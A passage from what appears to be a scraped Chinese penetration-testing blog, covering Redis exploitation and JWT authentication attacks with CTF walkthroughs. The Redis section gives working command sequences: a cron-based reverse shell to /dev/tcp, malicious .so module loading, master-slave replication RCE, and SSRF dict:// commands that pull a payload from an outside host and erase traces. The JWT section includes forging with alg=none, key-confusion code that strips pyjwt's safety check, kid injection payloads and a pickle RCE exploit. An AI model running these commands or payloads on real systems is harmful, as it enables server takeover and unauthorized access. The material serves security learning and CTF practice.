AAAAB3NzaC1yc2EAAAADAQABAAABAQDS/qmMvZpN8eHd3gMAMnfPPFpapS2yZeNvCTu0ToHyLfA6fvbg7RF9an6++3TXVPOljxQ8ABmGs223v4/XTlosxoH1wZDHGuqvyokocdj0vXEN0REF1Kb2rm8F/TboqA9/dKFpZbyd1MjtnfkQn8R3NC+QKrQr7FDHp5wjqOoQ6xiFBbgKa55k68JoBUpI3r/dhQ9oTe0SODK6XUcl7QZDvoOPxW/1nwAy6lTRdBlw8OCFT2jU9BUNpwob28eepGHXYiv2d5/5sxYc47MtckWHwiBS8IyqJbvIn3m6j7oF8QRIRetlNET4wkbfGPPzjfinSsiiYY8NTe6BGkWPaUdz 431774437@qq.com\\n\\n\"OK192.168.10.6:6379&gt; saveOK192.168.10.6:6379&gt; del rsapub(integer) 1 也需要将配置信息改回来 1ssh -i ~&#x2F;.ssh&#x2F;ye1s ye1s@192.168.10.6 写定时任务反弹shell必要条件: 拥有计划任务目录写权限 目标启动计划服务 定时任务的5个星号分别代表定时指定每分、小时、日、月、周 这个点其实蛮鸡肋，因为在debian、ubuntu等环境中由于这些环境对计划任务的格式解析非常严格是没办法执行成功,但是这个比前面那个比较好，主要是在centos环境的环境下默认root是可以通过这个方法拿到反弹shell的,所以还是指的说说的。 ubuntu无法利用的原因 /etc/crontab，脏数据解析失败 /var/spool/cron/crontabs/root，redis默认写入644非600，提示失败 Centos下的利用 实现命令: 1234set 1 &#39;\\n\\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;X.X.X.X&#x2F;7789 0&gt;&amp;1\\n\\n&#39;config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;config set dbfilename rootsave 查看定时任务执行状态: 1tail -f vim &#x2F;var&#x2F;log&#x2F;cron 模块加载执行命令必要条件 目标服务器上有.so文件 redis支持module命令 在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。so文件下载地址：exp.so主要原理为webshell上传.so文件，然后通过redis的module命令进行加载.so 1234module load /tmp/557.so 加载模块system.exec \"whoami\" 执行命令module list 查看现有模块module unload system 删除模块 主从复制在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大，下面就让我们从以前的redis RCE利用方式出发，一起聊聊关于redis的利用问题。 https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。 然后在从机上加载so文件，我们就可以执行拓展的新命令了 主从复制基础概念环境搭建： 123sudo docker pull redis:5.0sudo docker run --name master -p 6379:6379 -d redis:5.0sudo docker run --name slave -p 6378:6379 -d redis:5.0 看一下docker的ip地址 12docker inspect masterdocker inspect slave 这里的matser为172.17.0.2，slave为172.17.0.3进入slave中，使用slaveof设置mater为主服务器 12SLAVEOF 主服务器 6379 #可以将当前服务器转变为指定服务器的从属服务器SLAVEOF NO ONE #将使得这个从属服务器关闭复制功能，并从从属服务器转变回主服务器 这里slave从master复制了b数据 12345678910111213141516ye1s@ye1s:~/Desktop$ redis-cli -h 172.17.0.3 -p 6379172.17.0.3:6379&gt; slaveof 172.17.0.2 6379OK172.17.0.3:6379&gt; get b(nil)172.17.0.3:6379&gt; exitye1s@ye1s:~/Desktop$ redis-cli -h 172.17.0.2 -p 6379172.17.0.2:6379&gt; get b(nil)172.17.0.2:6379&gt; set b ye1sOK172.17.0.2:6379&gt; exitye1s@ye1s:~/Desktop$ redis-cli -h 172.17.0.3 -p 6379172.17.0.3:6379&gt; get b\"ye1s\"172.17.0.3:6379&gt; 主从复制利用主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。 主从复制RCE主要原理就是，攻击机通过协议认证成为主节点，目标redis服务器为从节点，通过全量复制将文件内容输出到目标服务器上(也就是写入so文件)。然后加载.so文件，完成命令执行。 必要条件： redis版本 &gt;= 4.x 脚本下载 1python redis-rce.py -L 192.168.10.8 -r 192.168.10.6 -f module.so window的利用踩坑记录-Redis(Windows)的getshell SSRF对redis利用简单探测redis服务: 12341.curl \"dict://127.0.0.1:6381\"2.回显-ERR Unknown subcommand or wrong number of arguments for 'libcurl'. Try CLIENT HELP+OK dict dict协议，字典服务器协议， A Dictionary Server Protocol 。 dict是基于查询响应的TCP协议。 使用格式: 1dict://serverip:port/命令:参数 这里dict有个比较好的特点就是会再末尾补上\\r\\n 不好的是,命令多条的话，需要一条条地去执行,因为不支持传入换行,也不会对%0d%0解码。dict协议的攻击: 1234567891011121314151.连接远程主服务器curl dict://127.0.0.1:6381/slaveof:101.200.157.195:210002.设置保存文件名curl dict://127.0.0.1:6381/config:set:dbfilename:exp.so3.载入 exp.socurl dict://127.0.0.1:6381/module:load:./exp.so4.断开主从curl dict://127.0.0.1:6381/slaveof:no:one5.恢复原始文件名curl dict://127.0.0.1:6381/config:set:dbfilename:dump.rdb6.执行命令curl dict://127.0.0.1:6381/system.exec:'whomai'7.删除痕迹curl dict://127.0.0.1:6381/system.exec:rm './exp.so...' gopher互联网上使用的分布型的文件搜集获取网络协议。 支持多行输入。 使用格式: 1gopher://serverip:port/_data opher的第一个字符被吞掉了，还有没有发送quit ,所以我们需要手动加一个字符如_这里采取goherus.py,来实现快速利用吧。 12git clone https:&#x2F;&#x2F;github.com&#x2F;tarunkant&#x2F;Gopherus.gitgopherus --exploit redis 参考文章：浅析Linux下Redis的攻击面(一)Redis安全小结redis数据库在渗透中的利用Redis 基于主从复制的 RCE 利用方式踩坑记录-Redis(Windows)的getshell","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://blog.cfyqy.com/tags/redis/"}],"author":"ye1s"},{"title":"JWT认证问题","slug":"JWT认证问题","date":"2020-07-24T02:15:00.000Z","updated":"2021-05-08T04:26:24.747Z","comments":true,"path":"article/5b1eb11e.html","link":"","permalink":"https://blog.cfyqy.com/article/5b1eb11e.html","excerpt":"JSON Web Token（缩写 JWT）是目前最流行的跨域认证解决方案。","text":"JSON Web Token（缩写 JWT）是目前最流行的跨域认证解决方案。 JWT 的原理JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。 12345&#123; &quot;姓名&quot;: &quot;张三&quot;, &quot;角色&quot;: &quot;管理员&quot;, &quot;到期时间&quot;: &quot;2020年7月1日0点0分&quot;&#125; 以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。 服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。 JWT 的数据结构实际的 JWT 大概就像下面这样。 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.l0qG4XbJbemqJXsaITaT8g78fkJ-boRvU2H7H1CY644 它是一个很长的字符串，中间用点（.）分隔成三个部分。JWT 的三个部分依次如下。 123Header（头部）Payload（负载）Signature（签名） HeaderHeader 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; 上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。 最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串 PayloadPayload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。 1234567iss (issuer)：签发人exp (expiration time)：过期时间sub (subject)：主题aud (audience)：受众nbf (Not Before)：生效时间iat (Issued At)：签发时间jti (JWT ID)：编号 除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。 12345&#123; &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true&#125; 注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。 这个 JSON 对象也要使用 Base64URL 算法转成字符串。 SignatureSignature 部分是对前两部分的签名，防止数据篡改。 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。 1234HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。 Base64URL前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。 JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com/?token=xxx）。Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。 完整token生成python 1pip install pyjwt token生成 12345import jwtkey='secret_key'encoded_jwt=jwt.encode(&#123;'username':'admin'&#125;,key,algorithm='HS256')print(encoded_jwt)print(jwt.decode(encoded_jwt,key,algorithms='HS256')) output 12b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.g0te4fe0-MjFyCTUVOjaq_ipV7em82cF06lzPOq3SkE'&#123;'username': 'admin'&#125; JWT 的使用方式客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。 此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息Authorization字段里面。 1Authorization: Bearer &lt;token&gt; 另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。 jwt在线加解密jwt的在线解密地址: http://jwt.calebb.net/jwt的在线加解密：地址https://jwt.io/ JWT的攻击方式一些JWT 漏洞相关的源码: https://github.com/Sjord/jwtdemo/ 敏感信息泄露由于payload是使用base64url编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行base64url解码，就可以读取到payload中携带的信息。 加密算法篡改空加密算法JWT支持使用空加密算法，可以在header中指定alg为None 这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。举个例子，使用以下的字段 1234567&#123; &quot;alg&quot; : &quot;None&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125;&#123; &quot;user&quot; : &quot;Admin&quot;&#125; 生成的完整token为 1ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0 (header+’.’+payload，去掉了’.’+signature字段) 示例 12345678import base64def b64urlencode(data): return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')payload='&#123;\"username\":\"test\"&#125;'header=\"&#123;\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"&#125;\"print b64urlencode(header) + '.'+ b64urlencode(payload)+ '.' 或者 123456import jwtdata=&#123; \"username\":\"test\"&#125;print(jwt.encode(data,\"\",algorithm='none')) output 1eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InRlc3QifQ. 将output的字符串放入到http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php 中 将RS256算法改为HS256HS256算法使用密钥为所有消息进行签名和验证,对称密码算法。 而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证,非对称密码算法。 如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。 由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。示例：RSA公钥：http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem 12345import jwtpublic = open('public.pem', 'r').read()print publicprint jwt.encode(&#123;\"data\":\"test\"&#125;, key=public, algorithm='HS256') 直接运行如上代码的会报错，pyjwt进行了判断。jwt/algorithms.py 12345678910111213141516def prepare_key(self, key): key = force_bytes(key) invalid_strings = [ b'-----BEGIN PUBLIC KEY-----', b'-----BEGIN CERTIFICATE-----', b'-----BEGIN RSA PUBLIC KEY-----', b'ssh-rsa' ] if any([string_value in key for string_value in invalid_strings]): raise InvalidKeyError( 'The specified key is an asymmetric key or x509 certificate and' ' should not be used as an HMAC secret.') return key prepare_key会判断是否有非法字符，简单粗暴的注释掉 12345678910111213141516def prepare_key(self, key): key = force_bytes(key) invalid_strings = [ b'-----BEGIN PUBLIC KEY-----', b'-----BEGIN CERTIFICATE-----', b'-----BEGIN RSA PUBLIC KEY-----', b'ssh-rsa' ] #if any([string_value in key for string_value in invalid_strings]): #raise InvalidKeyError( # 'The specified key is an asymmetric key or x509 certificate and' # ' should not be used as an HMAC secret.') return key 运行结果为 1234567891011-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JFNYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76fZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aFKwIDAQAB-----END PUBLIC KEY-----eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidGVzdCJ9.c-yX20a99ofP2yImxNn3vMtOgRvYqM4Xs8AZBMZ1aug 爆破HS256密钥不过对 JWT 的密钥爆破需要在一定的前提下进行： 知悉JWT使用的加密算法 一段有效的、已签名的token 签名用的密钥不复杂（弱密钥) 相关工具:c-jwt-crackerJWTPyCrack 修改KID参数kid是jwt header中的一个可选参数，全称是key ID，它用于指定加密算法的密钥 12345&#123; &quot;alg&quot; : &quot;HS256&quot;, &quot;typ&quot; : &quot;jwt&quot;, &quot;kid&quot; : &quot;&#x2F;home&#x2F;jwt&#x2F;.ssh&#x2F;pem&quot;&#125; 因为该参数可以由用户输入，所以也可能造成一些安全问题。 任意文件读取kid参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。 12345&#123; &quot;alg&quot; : &quot;HS256&quot;, &quot;typ&quot; : &quot;jwt&quot;, &quot;kid&quot; : &quot;&#x2F;etc&#x2F;passwd&quot;&#125; SQL注入kid也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证 12345&#123; &quot;alg&quot; : &quot;HS256&quot;, &quot;typ&quot; : &quot;jwt&quot;, &quot;kid&quot; : &quot;key11111111&#39; || union select &#39;secretkey&#39; -- &quot;&#125; 命令注入对kid参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了open函数，通过构造参数就可能造成命令注入。 1&quot;&#x2F;path&#x2F;to&#x2F;key_file|whoami&quot; 对于其他的语言，例如php，如果代码中使用的是exec或者是system来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。 修改JKU/X5U参数JKU的全称是”JSON Web Key Set URL”，用于指定一组用于验证令牌的密钥的URL。类似于kid，JKU也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。 X5U则以URI的形式数允许攻击者指定用于验证令牌的公钥证书或证书链，与JKU的攻击利用方式 例题[CISCN2019 华北赛区 Day1 Web2]ikun首页提示 ikun们冲鸭,一定要买到lv6!!!一直点击下一页，没有找到lv6,写个脚本寻找一下 123456789from time import sleepimport requestsurl=\"http://fe7b0375-7ea6-429f-bb30-8f39d45b0ab4.node3.buuoj.cn/shop?page=\"for i in range(0,500): r=requests.get(url+str(i)) sleep(0.3) if 'lv6.png' in r.text: print(i) break 可以找到lv6在181页中，进去查看后，发现要1145141919.0。随便测试一个test账号，账户余额1000元，远远不足。尝试抓包修改一下价格或折扣，修改价格时操作失败，修改折扣时，跳转到/b1g_m4mber 页面，显示只有admin才能访问。 这里使用的是JWT认证，将cookie中的JWT拿去解密https://jwt.io/ 可以得知使用的是HS256加密，要伪造的话，这里需要爆破secre的值，或者将alg修改为none，尝试一下。alg修改为none 123456789import jwtdata=&#123; \"username\":\"test\"&#125;print(jwt.encode(data,\"\",algorithm='none'))output:eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InRlc3QifQ. 将生成的jwt字符串替换掉cookie原来的jwt,访问服务器报错失败 爆破secret的值得到secret为1Kun 12345678910import jwtpayload=&#123; \"username\":\"admin\"&#125;secret=\"1Kun\"print(jwt.encode(payload,secret,algorithm=\"HS256\"))output:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo 修改JWT后，成功以admin的身份登录，发现一个unicode加密的字符串解密后 去lv6的页面源码找了一下，没有发现什么，再去访问一下/b1g_m4mber的页面内，发现了备份源码Admin.py 12345678910111213141516class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \"admin\": return self.render('form.html', res='This is Black Technology!', member=0) else: return self.render('no_ass.html') @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) 附上exp 12345678910111213import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = urllib.quote(a)print aoutput:c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. 将生成的payload放到隐藏的输入框里，只需将hidden=”hidden”删除即可 ctfhub敏感信息泄露123456789import base64def base64url_decode(s): return base64.b64decode(s.replace('-','+').replace('_','/').encode(\"utf-8\"))if __name__=='__main__': token = \"eyJBRyI6ImZjZGYyOTAzZTIxMmRiYX0iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsIkZMIjoiY3RmaHViezAxYWQxOWE3ZSJ9.-Zt7JBkTZaSi1HZRIqUGmhptnXZtrxw7Druqc4E_wvE\" parts = token.split('.') for i in range(2): print(base64url_decode(parts[i])) 运行结果为 12b'&#123;\"AG\":\"fcdf2903e212dba&#125;\",\"typ\":\"JWT\",\"alg\":\"HS256\"&#125;'b'&#123;\"username\":\"admin\",\"password\":\"admin\",\"FL\":\"ctfhub&#123;01ad19a7e\"&#125;' 空加密将token解密为 12b'&#123;\"typ\":\"JWT\",\"alg\":\"HS256\"&#125;'b'&#123;\"username\":\"admin\",\"password\":\"admin\",\"role\":\"guest\"&#125;' 将role改为admin,空加密 123import jwtpayload=&#123;\"username\":\"admin\",\"password\":\"admin\",\"role\":\"admin\"&#125;print(jwt.encode(payload,\"\",algorithm='none')) 弱密钥爆破工具：C语言：https://github.com/brendan-rius/c-jwt-cracker python: https://github.com/Ch1ngg/JWTPyCrack 12s@kali:~/Desktop/tool/c-jwt-cracker$ ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJndWVzdCJ9.1YHpMZXLB48AMPrbRCRjErGm5QexgDPtLK_Qdcj-ZJkSecret is \"czpe\" 解密一下token 12345678910111213141516171819202122import base64def base64url_decode(s): return base64.b64decode(s.replace('-','+').replace('_','/').encode(\"utf-8\"))def add_equal(string): length=len(string) remainder=length%4 if remainder==2: return string+\"==\" if remainder==3: return string+\"=\" return stringif __name__=='__main__': token=\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJndWVzdCJ9.1YHpMZXLB48AMPrbRCRjErGm5QexgDPtLK_Qdcj-ZJk\" parts = token.split('.') for i in range(2): part=add_equal(parts[i]) print(base64url_decode(part))'''result:b'&#123;\"typ\":\"JWT\",\"alg\":\"HS256\"&#125;'b'&#123;\"username\":\"admin\",\"password\":\"admin\",\"role\":\"guest\"&#125;'''' 生成token 1234567891011import jwtdef encode_token(payload,secret_key,alg): return jwt.encode(payload,secret_key,algorithm=alg)def decode_token(token,secret_key,alg): return jwt.decode(token, secret_key=secret_key, verify=False, algorithms=alg)if __name__=='__main__': payload=&#123;\"username\":\"admin\",\"password\":\"admin\",\"role\":\"admin\"&#125; secret_key=\"czpe\" alg='HS256' print(encode_token(payload,secret_key,alg)) 修改签名算法解密token 12345678910111213141516171819202122import base64def base64url_decode(s): return base64.b64decode(s.replace('-','+').replace('_','/').encode(\"utf-8\"))def add_equal(string): length=len(string) remainder=length%4 if remainder==2: return string+\"==\" if remainder==3: return string+\"=\" return stringif __name__=='__main__': token=\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.dx5pLYvXC6TXjA75dycVHPwNyPHCqbKBvCccRcA-8zKG6Qb0tfj0l7YoUJl7tvukT-dTZXMoCXnrdT3RlAuI_YqErZ-HYjfeSAt6KvRqrATYFlcBIZg2EAHG0XPQl7nkndX9jDNVrb0Xi4pxOAkBxxgNAUK-TY2OoKXU6DBpU2O8JmAh9x2kTjoyCBG2g-uTzyCjfVx6xx6NDYU_orvqU23g9eRqd7nbWj8mBpqejRoeBF1qfui5q61H4XFcotdg8WKkAs2UkyInUOggditC5J0F59iR8dMJkcszkH2-OZU9JrGVa9As3OsXWz9PYVAVx9yKSE_JDNLXRrAswCRKNA\" parts = token.split('.') for i in range(2): part=add_equal(parts[i]) print(base64url_decode(part))'''result:b'&#123;\"typ\":\"JWT\",\"alg\":\"RS256\"&#125;'b'&#123;\"username\":\"admin\",\"role\":\"guest\"&#125;'''' 一开始直接赋值publickey.pem的内容到本地文件,生成的token得不到flag; 直接在浏览器右键保存publickey.pem,能得到flag 12345678910111213import jwtdef encode_token(payload,secret_key,alg): return jwt.encode(payload,secret_key,algorithm=alg)def decode_token(token,secret_key,alg): return jwt.decode(token, secret_key=secret_key, verify=False, algorithms=alg)if __name__=='__main__': payload=&#123;\"username\":\"admin\",\"role\":\"admin\"&#125; #secret_key=\"czpe\" secret_key=open(\"publickey.pem\",'r').read() #print(secret_key) alg='HS256' print(encode_token(payload,secret_key,alg)) [HFCTF2020]EasyLogin随便注册一个账户密码，登入后发现有看到有get flag，但是没有权限读取。 F12查看源码，在source里看到static/js/app.js,提示静态路径设置不当，导致可任意访问服务端源码 1234/** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */ 尝试访问/app.js 12345678910111213141516171819202122232425262728293031323334353637const Koa = require('koa');const bodyParser = require('koa-bodyparser');const session = require('koa-session');const static = require('koa-static');const views = require('koa-views');const crypto = require('crypto');const &#123; resolve &#125; = require('path');const rest = require('./rest');const controller = require('./controller');const PORT = 3000;const app = new Koa();app.keys = [crypto.randomBytes(16).toString('hex')];global.secrets = [];app.use(static(resolve(__dirname, '.')));app.use(views(resolve(__dirname, './views'), &#123; extension: 'pug'&#125;));app.use(session(&#123;key: 'sses:aok', maxAge: 86400000&#125;, app));// parse request body:app.use(bodyParser());// prepare restful serviceapp.use(rest.restify());// add controllers:app.use(controller());app.listen(PORT);console.log(`app started at port $&#123;PORT&#125;...`); 从require文件包含知道还有controller.js和rest.js的文件 12const rest &#x3D; require(&#39;.&#x2F;rest&#39;);const controller &#x3D; require(&#39;.&#x2F;controller&#39;); rest.js 1234567891011121314151617181920212223242526272829module.exports = &#123; APIError: function (code, message) &#123; this.code = code || 'internal:unknown_error'; this.message = message || ''; &#125;, restify: () =&gt; &#123; const pathPrefix = '/api/'; return async (ctx, next) =&gt; &#123; if (ctx.request.path.startsWith(pathPrefix)) &#123; ctx.rest = data =&gt; &#123; ctx.response.type = 'application/json'; ctx.response.body = data; &#125;; try &#123; await next(); &#125; catch (e) &#123; ctx.response.status = 400; ctx.response.type = 'application/json'; ctx.response.body = &#123; code: e.code || 'internal_error', message: e.message || '' &#125;; &#125; &#125; else &#123; await next(); &#125; &#125;; &#125;&#125;; controller.js 12345678910111213141516171819202122232425262728293031const fs = require('fs');function addMapping(router, mapping) &#123; for (const url in mapping) &#123; if (url.startsWith('GET ')) &#123; const path = url.substring(4); router.get(path, mapping[url]); &#125; else if (url.startsWith('POST ')) &#123; const path = url.substring(5); router.post(path, mapping[url]); &#125; else &#123; console.log(`invalid URL: $&#123;url&#125;`); &#125; &#125;&#125;function addControllers(router, dir) &#123; fs.readdirSync(__dirname + '/' + dir).filter(f =&gt; &#123; return f.endsWith('.js'); &#125;).forEach(f =&gt; &#123; const mapping = require(__dirname + '/' + dir + '/' + f); addMapping(router, mapping); &#125;);&#125;module.exports = (dir) =&gt; &#123; const controllers_dir = dir || 'controllers'; const router = require('koa-router')(); addControllers(router, controllers_dir); return router.routes();&#125;; 从module.exports = (dir)模块导入中得知，还有controllers目录，以及api的接口请求，猜测有/controllers/api.js文件，访问可得 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = &#123; 'POST /api/register': async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || username === 'admin')&#123; throw new APIError('register error', 'wrong username'); &#125; if(global.secrets.length &gt; 100000) &#123; global.secrets = []; &#125; const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: 'HS256'&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, 'POST /api/login': async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || !password) &#123; throw new APIError('login error', 'username or password is necessary'); &#125; const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError('login error', 'no such secret id'); &#125; const secret = global.secrets[sid]; const user = jwt.verify(token, secret, &#123;algorithm: 'HS256'&#125;); const status = username === user.username &amp;&amp; password === user.password; if(status) &#123; ctx.session.username = username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, 'GET /api/flag': async (ctx, next) =&gt; &#123; if(ctx.session.username !== 'admin')&#123; throw new APIError('permission error', 'permission denied'); &#125; const flag = fs.readFileSync('/flag').toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, 'GET /api/logout': async (ctx, next) =&gt; &#123; ctx.session.username = null; ctx.rest(&#123; status: true &#125;) await next(); &#125;&#125;; 生成token 123const jwt = require('jsonwebtoken') token = jwt.sign(&#123;secretid:[], username:'admin', password:'123456'&#125;, '', &#123;algorithm: 'none'&#125;); console.log(token) 抓取登入框的包，并添加token。 请求flag [SCTF2019]Flag Shopbuy flag是购买flag,但是要求你的钱要到1e+27才行，work可以加钱，reset重置。审查页面元素没什么思路，发现robots.txt。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586require 'sinatra'require 'sinatra/cookies'require 'sinatra/json'require 'jwt'require 'securerandom'require 'erb'set :public_folder, File.dirname(__FILE__) + '/static'FLAGPRICE = 1000000000000000000000000000ENV[\"SECRET\"] = SecureRandom.hex(64)configure do enable :logging file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\") file.sync = true use Rack::CommonLogger, fileendget \"/\" do redirect '/shop', 302endget \"/filebak\" do content_type :text erb IO.binread __FILE__endget \"/api/auth\" do payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125; auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = authendget \"/api/info\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, &#123; algorithm: 'HS256' &#125; json(&#123;uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]&#125;)endget \"/shop\" do erb :shopendget \"/work\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, &#123; algorithm: 'HS256' &#125; auth = auth[0] unless params[:SECRET].nil? if ENV[\"SECRET\"].match(\"#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;\") puts ENV[\"FLAG\"] end end if params[:do] == \"#&#123;params[:name][0,7]&#125; is working\" then auth[\"jkl\"] = auth[\"jkl\"].to_i + 